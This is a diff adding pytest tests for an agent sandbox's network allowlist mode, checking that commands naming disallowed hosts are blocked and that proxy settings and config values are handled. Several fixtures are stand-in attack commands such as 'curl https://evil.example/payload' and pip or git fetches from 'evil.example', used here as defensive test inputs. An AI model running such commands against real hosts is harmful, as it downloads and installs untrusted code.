@@ -629,3 +629,91 @@ class TestSeccompInstallerFailClosed:
         r = sb.run("echo ok", shell=True)
         assert r.returncode == 126
         assert "fail-closed" in r.stderr
+
+
+class TestRestrictedAllowlist:
+    """Wave 3: network=allowlist -- soft per-host egress tier."""
+
+    def _sb(self, allowlist=None, **kw):
+        return RestrictedProcessBackend(workdir=".", network="allowlist", network_allowlist=allowlist or [], **kw)
+
+    def test_allowed_host_passes(self):
+        sb = self._sb(["pypi.org", "github.com"])
+        assert sb.network_allowed("curl https://pypi.org/simple/requests/") is True
+
+    def test_disallowed_host_blocked_126(self):
+        sb = self._sb(["pypi.org"])
+        res = sb.run("curl https://evil.example/payload", shell=True)
+        assert res.returncode == 126
+        assert "evil.example" in res.stderr
+        assert "network allowlist" in res.stderr
+
+    def test_pip_explicit_index_blocked(self):
+        sb = self._sb(["pypi.org"])
+        res = sb.run("pip install --index-url https://evil.example/simple x", shell=True)
+        assert res.returncode == 126
+
+    def test_pip_default_index_passes(self):
+        # No host WRITTEN in the command -> passes (soft tier constrains
+        # explicit destinations only; documented boundary).
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("pip install requests") is True
+
+    def test_git_ssh_form_scanned(self):
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("git clone git@github.com:org/repo.git") is True
+        res = sb.run("git clone git@evil.example:org/repo.git", shell=True)
+        assert res.returncode == 126
+
+    def test_glob_patterns(self):
+        sb = self._sb(["*.githubusercontent.com", "github.com"])
+        assert sb.network_allowed("curl https://raw.githubusercontent.com/x/y") is True
+        assert sb.network_allowed("curl https://codeload.evil.com/z") is False
+
+    def test_non_network_command_unaffected(self):
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("python3 -m unittest discover") is True
+        assert sb.network_allowed("ls -la") is True
+
+    def test_deny_mode_ignores_allowlist(self):
+        sb = RestrictedProcessBackend(workdir=".", network="deny", network_allowlist=["pypi.org"])
+        # deny still blanket-blocks curl regardless of the allowlist...
+        assert sb.network_allowed("curl https://pypi.org") is False
+        # ...and still does NOT scan pip (pre-existing deny posture).
+        assert sb.network_allowed("pip install x") is True
+
+    def test_proxy_env_stripped_under_allowlist(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        sb = self._sb(["pypi.org"])
+        env = sb.build_env()
+        assert "HTTPS_PROXY" not in env
+
+    def test_config_flow_yaml_to_backend(self):
+        from koboi.config import Config
+        from koboi.sandbox import build_sandbox
+
+        cfg = Config.from_dict(
+            {
+                "agent": {"name": "t"},
+                "llm": {"model": "m"},
+                "sandbox": {
+                    "backend": "restricted",
+                    "network": "allowlist",
+                    "network_allowlist": ["pypi.org", "*.npmjs.org"],
+                },
+            },
+            validate=True,
+        )
+        sb = build_sandbox(cfg.get("sandbox"))
+        assert sb.name == "restricted"
+        assert sb._network == "allowlist"
+        assert sb._network_allowlist == ["pypi.org", "*.npmjs.org"]
+
+    def test_network_value_typo_rejected(self):
+        from koboi.config import Config
+
+        with pytest.raises(ValueError, match="sandbox.network must be one of"):
+            Config.from_dict(
+                {"agent": {"name": "t"}, "llm": {"model": "m"}, "sandbox": {"network": "alowlist"}},
+                validate=True,
+            )
